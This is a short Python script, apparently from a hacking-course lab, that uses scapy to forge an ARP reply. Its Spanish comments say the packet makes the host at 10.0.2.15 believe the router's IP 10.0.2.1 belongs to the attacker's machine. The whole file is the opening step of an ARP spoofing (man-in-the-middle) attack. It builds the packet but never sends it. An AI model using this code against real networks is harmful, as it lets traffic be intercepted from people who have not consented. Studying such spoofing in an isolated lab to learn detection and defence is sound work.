#!/usr/bin/env python

import scapy.all as scapy
# si op es 1 manda un ARP request
# si op es 2 manda un ARP response

# psrc nos sirve para fingir que la ip que ocuparemos serà la del router con la mac de esta maquina
packet=scapy.ARP(op=2,pdst="10.0.2.15", hwdst="08:00:27:e6:e5:59", psrc="10.0.2.1")